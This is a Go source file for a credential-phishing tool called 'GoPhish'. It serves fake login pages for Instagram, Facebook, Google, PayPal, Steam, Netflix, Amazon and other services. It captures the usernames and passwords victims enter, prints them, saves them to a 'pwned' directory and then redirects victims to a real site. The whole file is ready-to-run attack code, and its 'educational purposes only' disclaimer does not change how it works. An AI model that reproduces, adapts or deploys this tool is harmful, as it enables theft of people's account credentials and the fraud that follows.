/*
A login phishing tool created by @DeadVCR.
http://deadvcr.com/
Simply compile and run. No dependencies needed!
Credits (Copyright)
Pages generated by An0nUD4Y (https://github.com/An0nUD4Y):
Instagram
Phishing Pages generated by Social Fish tool (UndeadSec) (https://github.com/UndeadSec/SocialFish):
Facebook,Google,Twitter
Phishing Pages generated by @suljot_gjoka (https://github.com/whiteeagle0/blackeye):
PayPal,eBay,CryptoCurrency,Adobe ID,Messenger,Twitch,Myspace,devianART
if I missed some let me know lol
**Reminder that DropBox is a steaming pile of shit and you should never ever use it :)**
*/

package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"sort"
	"strconv"
	"strings"
)

/*func main() {
	menu()
}*/

var sites map[int]string
var siteSelection int

// Login stores the user's login data
type Login struct {
	Username string
	Password string
}

// ChoiceHandler stores the user's choice
type ChoiceHandler struct {
	Choice int
	Redir  string
}

// Defaults store's the application defaults
type Defaults struct {
	Redirect string
	BindIP   string
	BindPort string
}

func main() {
	initChoices()
	displayMenu(true, "@DeadVCR", "http://deadvcr.com/")

	var defaults Defaults

	loaddefaults, err := ioutil.ReadFile("defaults.json")
	if err != nil {
		log.Fatal(err)
	}
	json.Unmarshal([]byte(loaddefaults), &defaults)

	choice, _ := userPrompt("[*] Choose an option: ")
	choiceInt, err := validateChoice(choice)
	if err != nil {
		crash("Your input was invalid.", 2)
	}
	siteSelection = choiceInt
	redir, _ := userPrompt("[*] Choose redirect URL (Default is " + defaults.Redirect + "): ")
	listenip, _ := userPrompt("[*] Enter IP to listen on (Default is " + defaults.BindIP + "): ")
	listenport, _ := userPrompt("[*] Enter port to listen on (Default is " + defaults.BindPort + "): ")

	if len(listenip) <= 2 {
		listenip = defaults.BindIP
	}
	listenip = strings.TrimSpace(listenip)
	redir = strings.TrimSpace(redir)
	listenport = strings.TrimSpace(listenport)
	if redir == "" {
		redir = defaults.Redirect
	}
	if len(listenport) == 0 {
		listenport = defaults.BindPort
	}
	loadTheWebMan(siteSelection, listenip, listenport, redir)
}

func loadTheWebMan(choice int, listenip, listenport, redir string) {
	choiceHandler := &ChoiceHandler{Choice: choice, Redir: redir}
	http.HandleFunc("/login", choiceHandler.giveMeYourInfo)
	http.HandleFunc("/", choiceHandler.epicTemplateLoader)
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
	fmt.Println("[*] HTTP listener started on " + listenip + ":" + listenport)
	log.Fatal(http.ListenAndServe(listenip+":"+listenport, nil))
}

func (p *Login) lmaoOwnedInfo(choice int) error {
	filename := p.Username + ".json"
	var login Login
	json.Unmarshal([]byte(filename), &login)
	m := Login{p.Username, p.Password}
	b, err := json.Marshal(m)
	if err != nil {
		log.Fatal(err)
	}

	path := "pwned/" + sites[choice]

	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0755)
	}
	fmt.Println("[!] Login retrieved!")
	fmt.Println("[!] Username: " + p.Username)
	fmt.Println("[!] Password: " + p.Password)
	fmt.Println("[*] Saved to " + path + "/" + filename)

	return ioutil.WriteFile(path+"/"+filename, b, 0755)
}

func (ch *ChoiceHandler) epicTemplateLoader(w http.ResponseWriter, r *http.Request) {
	p := &Login{}
	t, _ := template.ParseFiles("templates/" + sites[siteSelection] + "/login.html")
	t.Execute(w, p)
}

func (ch *ChoiceHandler) giveMeYourInfo(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	username := r.FormValue("username")
	password := r.FormValue("password")
	p := &Login{Username: username, Password: password}
	if p.Username == "" || p.Password == "" {
		http.Error(w, "Please enter a valid username or password!", 500)
		return
	}
	p.lmaoOwnedInfo(siteSelection)
	http.Redirect(w, r, "//"+ch.Redir, http.StatusFound)
}

func displayMenu(warning bool, name string, website string) {
	strings := []string{
		"",
		"Created by " + name,
		website, "",
		"GoPhish - Login Phishing Tool",
		"!!WARNING!! - Developers assume no liability and are not responsible to damage",
		"caused by this program. Please use ONLY for educational purposes. Thank you!",
		"--> ATTACKING TARGETS WITHOUT CONSENT IS ILLEGAL! <--",
		"",
		"Now... Pick your poison :)",
		"",
	}

	for _, v := range strings {
		fmt.Println(v)
	}

	ints := make([]int, 0, len(sites))
	for i := range sites {
		ints = append(ints, i)
	}
	sort.Ints(ints)

	for _, v := range ints {
		fmt.Printf("[%d] %s\n", v, sites[v])
	}

}

func initChoices() {
	sites = make(map[int]string)
	sites[1] = "Instagram"
	sites[2] = "Facebook"
	sites[3] = "Twitter"
	sites[4] = "Google"
	sites[5] = "PayPal"
	sites[6] = "Steam"
	sites[7] = "LinkedIn"
	sites[8] = "eBay"
	sites[9] = "Crypto Coin Sniper"
	sites[10] = "Adobe ID"
	sites[11] = "Messenger"
	sites[12] = "Twitch"
	sites[13] = "Badoo"
	sites[14] = "deviantART"
	sites[15] = "Snapchat"
	sites[16] = "Netflix"
	sites[17] = "Amazon"
}

func userPrompt(prompt string) (string, error) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(prompt)
	response, err := reader.ReadString('\n')
	return response, err
}

func validateChoice(choice string) (int, error) {
	i, err := strconv.Atoi(strings.TrimSpace(choice))
	if err != nil {
		return 0, err
	}
	return i, nil
}

func crash(reason string, s int) {
	fmt.Println(reason)
	fmt.Printf("Exitting in %d seconds...\n", s)
	os.Exit(1)
}
